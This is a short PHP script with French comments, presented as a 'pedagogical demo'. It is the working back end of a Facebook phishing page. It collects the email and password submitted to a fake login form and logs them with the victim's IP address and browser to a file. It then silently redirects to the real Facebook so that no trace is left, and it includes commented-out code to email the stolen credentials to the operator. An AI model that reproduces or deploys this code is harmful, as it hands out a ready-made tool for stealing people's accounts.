<?php
// =============================================
// fb-login.php - Script de capture (démo pédagogique)
// =============================================

// Vérifie que les données ont bien été envoyées en POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Récupère les champs du formulaire
    $email    = isset($_POST['email'])    ? trim($_POST['email'])    : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    // Si les champs ne sont pas vides, on enregistre
    if (!empty($email) && !empty($password)) {

        // Prépare une ligne à écrire dans le fichier
        $date    = date('Y-m-d H:i:s');
        $ip      = $_SERVER['REMOTE_ADDR'];
        $ua      = $_SERVER['HTTP_USER_AGENT'];
        $logLine = "[$date] IP: $ip | Email: $email | Mot de passe: $password | UA: $ua" . PHP_EOL;

        // Écrit dans captured.txt (en mode ajout)
        file_put_contents(__DIR__ . '/captured.txt', $logLine, FILE_APPEND | LOCK_EX);

        // --- Option secrète : envoi par mail (si tu veux) ---
        // Décommente ces lignes si tu veux recevoir les identifiants par email
        // $to      = 'ton-adresse@email.com';
        // $subject = '🚨 Captured Facebook - ' . $email;
        // $message = "Email: $email\nPassword: $password\nIP: $ip\nDate: $date\nUA: $ua";
        // @mail($to, $subject, $message);

    }

    // Redirige vers le vrai Facebook quoi qu'il arrive
    header('Location: https://www.facebook.com');
    exit;

} else {
    // Si quelqu'un accède directement au fichier sans POST
    // On le redirige aussi vers Facebook (pas de trace)
    header('Location: https://www.facebook.com');
    exit;
}
?>